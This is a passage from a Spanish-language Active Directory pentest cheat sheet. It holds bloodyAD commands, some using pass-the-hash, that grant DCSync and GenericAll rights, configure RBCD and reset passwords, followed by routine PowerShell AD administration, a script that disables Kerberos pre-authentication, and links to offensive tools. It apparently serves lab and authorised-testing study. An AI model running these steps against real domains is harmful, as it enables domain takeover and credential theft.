bloodyAD --host 172.16.1.10 -d hacklab.local -u elliot.alderson -p :501234567cb0524c799ac25b439ab6a21 set password targetuser newpassword
```

**Agregar privilegio dcsync a un objeto**
```bash
bloodyAD -d hacklab.local --host 172.16.1.5 -u Administrator -p :50123468cb0524c799ac25b439ab6a21 add dcsync administrator
```

**Agregar GenericAll a un objeto**
```bash
bloodyAD -d hacklab.local --host 172.16.1.5 -u Administrator -p :50123468cb0524c799ac25b439ab6a21 add genericAll MS01$ administrator
```

**Agregar usuario a grupo**
```bash
bloodyAD -d hacklab.local --host 172.16.1.5 -u Administrator -p :50123468cb0524c799ac25b439ab6a21 add groupMember 'Administrators' test
```

**Enlazar un GPO**
```bash
bloodyAD -d ecorp.local --host 10.10.1.128 -u bob -p Password123! set object SRV01$ GPLink -v CN={2AADC2C9-C75F-45EF-A002-A22E1893FDB5},CN=POLICIES,CN=SYSTEM,DC=ECORP,DC=LOCAL
```

**Buscar objetos eliminados**
```bash
bloodyAD --host 192.168.56.10 -d hacklab.local -u elliot.alderson -p Password123! get writable --include-del
```

**Escribir SPN**
```bash
bloodyAD --host 192.168.56.10 -d hacklab.local -u elliot.alderson -p Password123! set object $target servicePrincipalName -v 'fake/spn'
```

**Restaurar objeto eliminado**
```bash
bloodyAD --host 192.168.56.10 -d hacklab.local -u elliot.alderson -p Password123! -k set restore $user_to_restore
```

**Crear nueva cuenta de equipo**
```bash
bloodyAD --host 192.168.56.10 -d hacklab.local -u elliot.alderson -p Password123! add computer $computer_name $computer_password
```

**Agregar RBCD (Resource Based Constrained Delegation)**
```bash
bloodyAD --host 192.168.56.10 -d hacklab.local -u elliot.alderson -p Password123! add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
```

**Habilitar una cuenta deshabilitada**
```bash
bloodyAD --host 192.168.56.10 -d hacklab.local -u elliot.alderson -p Password123! remove uac $target_username -f ACCOUNTDISABLE
```

**Cambiar contraseña**
```bash
bloodyAD --host 192.168.56.10 -d hacklab.local -u elliot.alderson -p Password123! set password $target_username $new_password
```

**Agregar usuario a grupo**
```bash
bloodyAD --host 192.168.56.10 -d hacklab.local -u elliot.alderson -p Password123! add groupMember $group_name $member_to_add
```

### PowerShell para gestionar AD

Listado de Cmdlets utiles para realizar operaciones y enumeración básica en Active Directory.

Para utilizar la mayoria de los Cmdlets listados a continuación, debemos importar en primer lugar el modulo `ActiveDirectory`.

```bash
Import-Module ActiveDirectory
```

#### **Sistema**

**Obtener Variables de entorno**

```bash
Get-ChildItem Env:
```

**Obtener funciones en el scope de Powershell**

```bash
Get-Command -CommandType Function
```

**Obtener una lista de los modulos de PowerShell cargados**

```bash
Get-Module
```

**Listar comandos para un módulo específico**

```bash
Get-Command -Module ActiveDirectory
```

**Obtener información del Dominio**

```bash
Get-ADDomain
```

**Obtener ayuda de un cmd-let**

```bash
Get-Help <cmd-let>
```

**Obtener el estado actual de Windows Defender**

```bash
Get-MpComputerStatus
```

**Obtener AppLockerPolicy**

```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### **Usuarios**

**Crear un nuevo usuario**

```bash
New-ADUser -Name "NombreUsuario" -SamAccountName "NombreUsuario" -UserPrincipalName "NombreUsuario@dominio.local" -AccountPassword (ConvertTo-SecureString -AsPlainText "Contraseña" -Force)
```

**Filtrar por un nombre de usuario especifico**

```bash
Get-ADUser -Filter * | Where-Object {$_.SamAccountName -eq "NombreUsuario"}
```

En este comando:

- `Get-ADUser -Filter *` obtiene todos los usuarios de Active Directory.
- `Where-Object` se utiliza para filtrar los resultados.
- `{}` delimita el script de bloque para la condición de filtro.
- `$_` representa el objeto actual en el pipeline (en este caso, cada usuario obtenido por Get-ADUser).
- `.SamAccountName` es la propiedad que contiene el nombre de usuario.
- `eq "NombreUsuario"` es el operador de igualdad para comparar el valor de la propiedad SamAccountName con el nombre de usuario que deseas buscar.

**Filtrar por un usuario donde el campo ServicePrincipalName sea distinto de null**

```bash
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

**Crear un nuevo usuario asignado algunos atributos**

```bash
New-ADUser -Name "first last" -Accountpassword (Read-Host -AsSecureString "Super$ecurePassword!") -Enabled $true -OtherAttributes @{'title'="Analyst";'mail'="f.last@domain.local"}
```

**Agregar un usuario a un grupo específico**

```bash
Add-ADGroupMember -Identity "NombreGrupo" -Members "NombreUsuario"
```

**Cambiar la contraseña de un usuario**

```bash
Set-ADAccountPassword -Identity "NombreUsuario" -NewPassword (ConvertTo-SecureString -AsPlainText "NuevaContraseña" -Force) -Reset
```

**Obtener los grupos del un usuario**

```bash
$user = Get-ADUser -Identity "NombreUsuario"
$groups = Get-ADPrincipalGroupMembership -Identity $user
$groups | Select-Object -ExpandProperty Name
```

**Quitar un usuario de un grupo**

```bash
Remove-ADGroupMember -Identity "NombreGrupo" -Members "NombreUsuario"
```

**Deshabilitar una cuenta de usuario**

```bash
Disable-ADAccount -Identity "NombreUsuario"
```

**Habilitar una cuenta de usuario**

```bash
Enable-ADAccount -Identity "NombreUsuario"
```

**Desbloquear una cuenta de usuario**

```bash
Unlock-ADAccount -Identity "NombreUsuario"
```

**Obtener información detallada de un usuario**

```bash
Get-ADUser -Identity "NombreUsuario" -Properties *
```

#### Grupos

**Crear un nuevo grupo**

```bash
New-ADGroup -Name "NombreGrupo" -GroupCategory Security -GroupScope Global -DisplayName "Nombre Descriptivo del Grupo" -Description "Descripción del Grupo"
```

**Listar los miembros de un grupo**

```bash
Get-ADGroupMember -Identity "NombreGrupo" | Select-Object Name, SamAccountName
```

**Obtener información detallada de un grupo**

```bash
Get-ADGroup -Identity "NombreGrupo" -Properties *
```

**Renombrar un grupo**

```bash
Rename-ADObject -Identity "CN=NombreGrupo,OU=Origen,DC=dominio,DC=com" -NewName "NuevoNombreGrupo"
```

**Eliminar un grupo**

```bash
Remove-ADGroup -Identity "NombreGrupo"
```

**Listar los grupos**

```bash
Get-ADGroup -Filter * | select name
```

**Obtener una lista de todos los grupos en una OU específica**

```bash
Get-ADGroup -Filter * -SearchBase "OU=NombreOU,DC=dominio,DC=com"
```

**Obtener una lista de todos los miembros de un grupo**

```bash
Get-ADGroupMember -Identity "NombreGrupo"
```

#### Trusts (Confianzas)

**Verificar las relaciones de confianza de dominio**

```bash
Get-ADTrust -Filter *
```

Este cmdlet imprimirá las relaciones de confianza que tenga el dominio. Podemos determinar si son confianzas dentro de nuestro bosque o con dominios de otros bosques, el tipo de confianza, la dirección de la confianza y el nombre del dominio con el que está la relación.

#### Computadoras

**Obtener información detallada de un equipo**

```bash
Get-ADComputer -Identity "NombreEquipo" -Properties *
```

**Obtener una lista de todos los equipos en un dominio**

```bash
Get-ADComputer -Filter *
```

**Obtener información detallada de un equipo específico**

```bash
Get-ADComputer -Identity "NombreEquipo" -Properties *
```

**Crear un nuevo objeto de equipo en Active Directory**

```bash
New-ADComputer -Name "NombreEquipo" -Path "OU=NombreOU,DC=dominio,DC=com"
```

**Cambiar el nombre de un equipo en Active Directory**

```bash
Rename-ADObject -Identity "CN=NombreEquipo,OU=Origen,DC=dominio,DC=com" -NewName "NuevoNombreEquipo"
```

**Deshabilitar una cuenta de equipo**

```bash
Disable-ADAccount -Identity "NombreEquipo"
```

**Habilitar una cuenta de equipo**

```bash
Enable-ADAccount -Identity "NombreEquipo"
```

**Eliminar un objeto de equipo de Active Directory**

```bash
Remove-ADComputer -Identity "NombreEquipo"
```

#### Unidades Organizativas

**Crear una nueva Unidad Organizativa**

```bash
New-ADOrganizationalUnit -Name "NombreOU" -Path "OU=ParentOU,DC=dominio,DC=com"
```

**Mover un objeto (usuario, grupo, etc.) a una OU diferente**

```bash
Move-ADObject -Identity "CN=NombreObjeto,OU=Origen,DC=dominio,DC=com" -TargetPath "OU=Destino,DC=dominio,DC=com"
```

**Obtener una lista de todas las unidades organizativas**

```bash
Get-ADOrganizationalUnit -Filter *
```

**Mover un equipo a una unidad organizativa diferente**

```bash
Move-ADObject -Identity "CN=NombreEquipo,OU=Origen,DC=dominio,DC=com" -TargetPath "OU=Destino,DC=dominio,DC=com"
```

#### GPO (Group Policy Object)

**Obtener una lista de todas las GPO**

```bash
Get-GPO -All
```

**Obtener una lista de todas las GPO en un dominio específico**

```bash
Get-GPO -All -Domain "NombreDominio"
```

**Crear una nueva GPO**

```bash
New-GPO -Name "NombreGPO"
```

**Cambiar el nombre de una GPO**

```bash
Rename-GPO -Name "NombreActualGPO" -NewName "NuevoNombreGPO"
```

**Copiar una GPO**

```bash
Copy-GPO -SourceName "NombreGPOOrigen" -TargetName "NombreGPODestino"
```

**Eliminar una GPO**

```bash
Remove-GPO -Name "NombreGPO"
```

**Obtener la configuración de una GPO**

```bash
Get-GPOReport -Name "NombreGPO" -ReportType XML
```

**Establecer la configuración de una GPO**

```bash
Set-GPRegistryValue -Name "NombreGPO" -Key "HKEY_CURRENT_USER\\Software\\Ejemplo" -ValueName "Ejemplo" -Type String -Value "ValorEjemplo"
```

**Enlace de una GPO a una OU específica**

```bash
New-GPLink -Name "NombreGPO" -Target "OU=NombreOU,DC=dominio,DC=com"
```

**Desenlace de una GPO de una OU específica**

```bash
Remove-GPLink -Name "NombreGPO" -Target "OU=NombreOU,DC=dominio,DC=com"
```

**Realizar una copia de seguridad y restauración de una GPO**

Para realizar una copia de seguridad:

```bash
Backup-GPO -Name "NombreGPO" -Path "C:\\Path\\Backup"
```

Para restaurar desde una copia de seguridad:

```bash
Restore-GPO -Name "NombreGPO" -Path "C:\\Path\\Backup"
```

#### Habilitar DONT-REQ-PRE-AUTH

```powershell
# Nombre del usuario a modificar
$user = "usuario.test"

# Obtener el objeto del usuario
$u = Get-ADUser -Identity $user -Properties userAccountControl

# Mostrar los flags actuales
Write-Host "UAC antes: $($u.userAccountControl)"

# Agregar la flag de DONT_REQUIRE_PREAUTH
$newUAC = $u.userAccountControl -bor 0x400000

# Aplicar el nuevo valor
Set-ADUser -Identity $user -Replace @{userAccountControl=$newUAC}

# Verificar
(Get-ADUser -Identity $user -Properties userAccountControl).userAccountControl
```

#### Deshabilitar `DONT-REQ-PRE-AUTH`

```powershell
$newUAC = $u.userAccountControl -band -bnot 0x400000
Set-ADUser -Identity $user -Replace @{userAccountControl=$newUAC}
```

## Herramientas y Recursos
Enlaces a las distintas herramientas y recursos.

### Pivoting

| Nombre    | URL                                                                      |
| --------- | ------------------------------------------------------------------------ |
| Chisel    | [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) |
| Ligolo-ng | https://github.com/nicocha30/ligolo-ng                                   |

### Information Gathering

| Nombre | URL                          |
| ------ | ---------------------------- |
| Nmap   | https://github.com/nmap/nmap |


### Web

| Nombre                     | URL                                                                          |
| -------------------------- | ---------------------------------------------------------------------------- |
| ffuf                       | https://github.com/ffuf/ffuf                                                 |
| Gobuster                   | https://github.com/OJ/gobuster                                               |
| PayloadAllTheThings        | https://github.com/swisskyrepo/PayloadsAllTheThings                          |
| Wfuzz                      | https://github.com/xmendez/wfuzz                                             |
| WhatWeb                    | https://github.com/urbanadventurer/WhatWeb                                   |
| WPScan                     | https://github.com/wpscanteam/wpscan                                         |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator                      |
| Leaky Paths                | https://github.com/ayoubfathi/leaky-paths                                    |
| Joomscan                   | https://github.com/OWASP/joomscan                                            |
| Droopescan                 | https://github.com/SamJoan/droopescan                                        |
| Magescan                   | https://github.com/steverobbins/magescan                                     |
| Git-Dumper                 | https://github.com/arthaud/git-dumper                                        |
| Extractor                  | https://github.com/internetwache/GitTools/blob/master/Extractor/extractor.sh |


### Password Attacks

| Nombre                          | URL                                                                                                        |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Default Credentials Cheat Sheet | [https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) |
| Firefox Decrypt                 | [https://github.com/unode/firefox_decrypt](https://github.com/unode/firefox_decrypt)                       |
| hashcat                         | [https://hashcat.net/hashcat](https://hashcat.net/hashcat)                                                 |
| Hydra                           | [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)                   |
| John                            | [https://github.com/openwall/john](https://github.com/openwall/john)                                       |
| keepass-dump-masterkey          | [https://github.com/CMEPW/keepass-dump-masterkey](https://github.com/CMEPW/keepass-dump-masterkey)         |
| KeePwn                          | [https://github.com/Orange-Cyberdefense/KeePwn](https://github.com/Orange-Cyberdefense/KeePwn)             |
| Kerbrute                        | [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)                                   |
| LaZagne                         | [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)                           |
| mimikatz                        | [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)                           |
| NetExec                         | [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)                             |
| ntlm.pw                         | [https://ntlm.pw](https://ntlm.pw)                                                                         |
| pypykatz                        | [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)                                 |


### Wordlists

| SecLists                      | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)                           |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| Kerberos Username Enumeration | [https://github.com/attackdebris/kerberos_enum_userlists](https://github.com/attackdebris/kerberos_enum_userlists) |
| CUPP                          | [https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)                                                     |
| Username Anarchy              | [https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)         |
| CeWL                          | [https://github.com/digininja/cewl](https://github.com/digininja/cewl)                                             |
| API Wordlist                  | https://github.com/chrislockard/api_wordlist/blob/master/api_seen_in_wild.txt                                      |


### Escalación de privilegios

| Nombre      | URL                                                      |
| ----------- | -------------------------------------------------------- |
| Winpeas     | https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS |
| Seatbelt    | https://github.com/GhostPack/Seatbelt                    |
| Linpeas     | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS |
| SigmaPotato | https://github.com/tylerdotrar/SigmaPotato               |

### Recursos y Blogs

| Nombre                                                  | URL                                                                                                                                                                          |
| ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 0xdf                                                    | [https://0xdf.gitlab.io/](https://0xdf.gitlab.io/)                                                                                                                           |
| IppSec.rocks                                            | [https://ippsec.rocks/?#](https://ippsec.rocks/?#)                                                                                                                           |
| IppSec (YouTube)                                        | [https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)                                                         |
| HackTricks                                              | [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)                                                                                                                 |
| HackTricks Local Windows Privilege Escalation Checklist | [https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation) |

